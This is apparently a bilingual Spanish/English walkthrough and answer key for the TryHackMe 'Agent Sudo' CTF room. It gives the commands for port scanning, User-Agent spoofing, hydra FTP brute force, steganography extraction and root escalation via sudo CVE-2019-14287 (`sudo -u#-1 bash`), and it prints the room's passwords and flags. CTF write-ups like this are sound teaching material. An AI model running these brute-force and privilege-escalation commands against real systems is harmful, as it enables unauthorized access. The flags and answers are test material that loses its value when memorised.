# Agent Sudo

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|-----------|------|------|------|---------|--------|--------------|---------|
| Easy | CTF challenge | `agentsudo` | https://tryhackme.com/room/agentsudo | 01 Level Easy | TryHackMe | Nmap / curl (User-Agent) / hydra (FTP) / binwalk / zip2john & john / base64 / steghide / SSH / sudo CVE-2019-14287 | Máquina CTF narrativa: enumera puertos, cambia el User-Agent, fuerza la contraseña FTP, saca contenido oculto por esteganografía y escala privilegios por sudo. |

---

**Contexto:** CTF guiado con historia: se encuentra un servidor secreto bajo el mar y hay que hackearlo para revelar la verdad. La resolución combina enumeración de puertos (FTP 21, SSH 22, HTTP 80), una web que exige usar un codename como User-Agent, fuerza bruta FTP con hydra/rockyou, esteganografía (binwalk, zip2john/john, steghide) para recuperar el acceso de otro agente por SSH, y una escalada de privilegios explotando la vulnerabilidad de sudo 1.8.21p2 (CVE-2019-14287). Al final el mensaje reconoce el compromiso como diseñado para la plataforma.

> **ES:** "You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth." Enumeración, User-Agent, FTP/esteganografía, SSH y CVE-2019-14287.
> **EN:** "You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth." Enumeration, User-Agent, FTP/stego, SSH and CVE-2019-14287.

## Solucionario

### Task 1: Desplegar / Deploy

**Explicación:** Se despliega la máquina y se une la red de TryHackMe (VPN o AttackBox) para alcanzar el objetivo. No requiere respuesta más allá de tener la caja en línea.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Despliega la máquina y conéctate a la red. | `No answer needed` |

### Task 2: Enumeración / Enumerate

**Explicación:** Un escaneo con Nmap revela 3 puertos abiertos (FTP 21, SSH 22 y HTTP 80). En el servidor web, una nota indica: "Dear agents, use your own codename as user-agent to access the site". Para poder ver la página hay que cambiar el **user-agent** y usar el codename **chris** como valor.

```bash
nmap -sV -sC MACHINE_IP
# 21/tcp open ftp, 22/tcp open ssh, 80/tcp open http  -> 3 puertos
curl -A user-agent http://MACHINE_IP/
curl -A chris http://MACHINE_IP/
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | How many open ports? / ¿Cuántos puertos abiertos hay? | `3` |
| 2 | How do you redirect yourself to a secret page? / ¿Cómo te rediriges a una página secreta? | `user-agent` |
| 3 | What is the agent's codename revealed after changing the user-agent? / ¿Cuál es el codename del agente que se revela al cambiar el user-agent? | `chris` |

### Task 3: Cracking de hash y fuerza bruta / Hash cracking and brute-force

**Explicación:** La página revela que el codename del agente también sirve de pista para las contraseñas. Se fuerza la contraseña FTP de `chris` con hydra y rockyou: `crystal`. Por FTP se descargan las imágenes; `binwalk` sobre `cute-alien.jpg`/`cutie.png` saca un zip (`8702.zip`) cuyo hash se crackea con john: `alien`. Dentro hay un mensaje con `QXJlYTUx` que decodificado en base64 da `Area51`, la passphrase de `steghide`. Con `steghide` y esa passphrase se extrae `message.txt`, donde chris revela el codename del otro agente, **james**, y su contraseña de login: **hackerrules!**.

```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://MACHINE_IP
# [21][ftp] host: MACHINE_IP login: chris password: crystal
ftp MACHINE_IP            # chris : crystal
# binwalk -e cute-alien.jpg  -> 8702.zip
zip2john 8702.zip > zip.hash && john zip.hash   # -> alien
# 7z x 8702.zip  (password: alien) -> To_agentR.txt
cat To_agentR.txt         # ... QXJlYTUx ...
echo QXJlYTUx | base64 -d # -> Area51
steghide extract -sf cute-alien.jpg   # passphrase: Area51 -> message.txt
cat message.txt           # "Hi james, ... your login password is hackerrules!"
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the FTP password of agent chris? / ¿Cuál es la contraseña FTP del agente chris? | `crystal` |
| 2 | What is the password of the zip file inside the image? / ¿Cuál es la contraseña del zip contenido en la imagen? | `alien` |
| 3 | What is the password to extract the hidden message with steghide? / ¿Cuál es la contraseña para extraer el mensaje oculto con steghide? | `Area51` |
| 4 | What is the codename of the second agent? / ¿Cuál es el codename del segundo agente? | `james` |
| 5 | What is the login password of the second agent? / ¿Cuál es la contraseña de acceso del segundo agente? | `hackerrules!` |

### Task 4: Steganografía y flag de usuario / Steganography and User Flag

**Explicación:** Con las credenciales de `james` se entra por SSH. En su home se recupera la flag de usuario (el hash md5 entregado por la room) y una imagen sobre el reto Area51: la investigación de la imagen (búsqueda por similitud) muestra que representa la "Roswell alien autopsy".

```bash
ssh james@MACHINE_IP        # password: hackerrules!
ls -la
cat user.txt / md5sum user.txt
# Alien_autopsy.jpg -> buscar la imagen -> contenido: Roswell alien autopsy
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the user flag? / ¿Cuál es la flag de usuario? | `b03d975e8c92a7c04146cfa7a5a313c7` |
| 2 | What does the Area51 picture show? / ¿Qué muestra la imagen del reto Area51? | `Roswell alien autopsy` |

### Task 5: Escalada de privilegios / Privilege Escalation

**Explicación:** Se comprueba la versión de sudo (`sudo -l`): sudo 1.8.21p2, vulnerable a CVE-2019-14287 (ejecutar el comando como el UID -1). Con `sudo -u#-1 bash` se obtiene root y se recupera la flag de root (hash md5). El mensaje final felicita por pwnear la caja. La técnica/exploit fue publicada por DesKel.

```bash
james@agent-sudo:~$ sudo -l
# Sudo version 1.8.21p2 -> CVE-2019-14287
james@agent-sudo:~$ sudo -u#-1 bash
root@agent-sudo:/home/james# cat /root/root.txt   # md5 de la flag root
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the CVE for the sudo vulnerability (sudo 1.8.21p2)? / ¿Cuál es el CVE de la vulnerabilidad de sudo? | `CVE-2019-14287` |
| 2 | What is the root flag? / ¿Cuál es la flag de root? | `b53a02f55b57d4439e3341834d70c062` |
| 3 | Who is the author of the sudo 1.8.21p2 exploit? / ¿Quién es el autor del exploit para sudo 1.8.21p2? | `DesKel` |

---

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | How many open ports? | `3` |
| 2 | How do you redirect yourself to a secret page? | `user-agent` |
| 3 | What is the agent's codename revealed after changing the user-agent? | `chris` |
| 4 | What is the FTP password of agent chris? | `crystal` |
| 5 | What is the password of the zip file inside the image? | `alien` |
| 6 | What is the password to extract the hidden message with steghide? | `Area51` |
| 7 | What is the codename of the second agent? | `james` |
| 8 | What is the login password of the second agent? | `hackerrules!` |
| 9 | What is the user flag? | `b03d975e8c92a7c04146cfa7a5a313c7` |
| 10 | What does the Area51 picture show? | `Roswell alien autopsy` |
| 11 | What is the CVE for the sudo vulnerability (sudo 1.8.21p2)? | `CVE-2019-14287` |
| 12 | What is the root flag? | `b53a02f55b57d4439e3341834d70c062` |
| 13 | Who is the author of the sudo 1.8.21p2 exploit? | `DesKel` |

---

**Metodología:** Enumeración con Nmap (3 puertos) -> cambiar el User-Agent al codename `chris` -> fuerza bruta FTP con hydra (crystal) -> binwalk/zip2john/john (alien) y base64 (Area51) -> steghide extrae el mensaje con `james:hackerrules!` -> SSH -> flags de usuario y de la imagen -> comprobar sudo 1.8.21p2 y explotar CVE-2019-14287 con `sudo -u#-1 bash` -> flag de root.

### Cadena de ataque / Attack Chain

```text
Nmap (FTP 21/SSH 22/HTTP 80) -> User-Agent: chris -> hydra FTP (crystal) -> binwalk + zip2john/john (alien) -> base64 QXJlYTUx = Area51 -> steghide (message.txt) -> james:hackerrules! -> SSH -> user flag + Alien_autopsy.jpg -> sudo CVE-2019-14287 (sudo -u#-1 bash) -> root flag
```

**Learning chain:** Enumeración de servicios -> User-Agent como vector web -> brute-force FTP -> esteganografía (binwalk, zip/john, steghide, base64) -> SSH -> escalada por sudo CVE-2019-14287 -> root.

**Lección:** *Las pistas narrativas (codename como user-agent y como semilla de contraseñas) encadenan enumeración, fuerza bruta y esteganografía; y una versión vieja de sudo puede convertir un usuario de bajo privilegio en root.*

**MITRE ATT&CK:** T1046 (Network Service Discovery), T1595 (Active Scanning), T1110 (Brute Force), T1204 (User Execution/curl), T1552 (Unsecured Credentials/stego), T1078 (Valid Accounts), T1068 (Exploitation for Privilege Escalation - CVE-2019-14287)

**Fuente:** [TryHackMe - Agent Sudo](https://tryhackme.com/room/agentsudo)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.